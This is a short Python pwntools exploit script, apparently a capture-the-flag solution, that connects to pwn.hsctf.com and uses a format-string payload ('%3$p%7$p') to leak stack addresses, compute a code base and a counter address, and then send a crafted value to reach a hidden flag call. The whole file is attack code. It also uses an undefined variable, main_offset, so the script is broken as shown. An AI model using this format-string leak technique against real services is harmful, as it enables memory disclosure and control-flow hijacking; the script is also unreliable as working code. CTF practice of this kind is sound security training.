from pwn import *

###Utils
def modify(payload):
    if type(payload) is int:
        payload = hex(payload)[2:]
    print(payload)
    r.sendlineafter('byte: ',payload)
    return r.recvline()

###Exploit
###Optimization causes IDA to discard some never reached segments in code
###Run it through gdb to notice there is actually a call to flag in main with some constraints
r = remote('pwn.hsctf.com',6666)

leaks = modify('%3$p%7$p').decode().split(' ')[0]
leaks = leaks.split('0x')[1:3]
code_base = int(leaks[0],16)-main_offset-247
cntr_addr = int(leaks[1],16)-0x134
CMP = cntr_addr-6
print(hex(code_base))
print(hex(cntr_addr))
modify(CMP)

r.interactive()
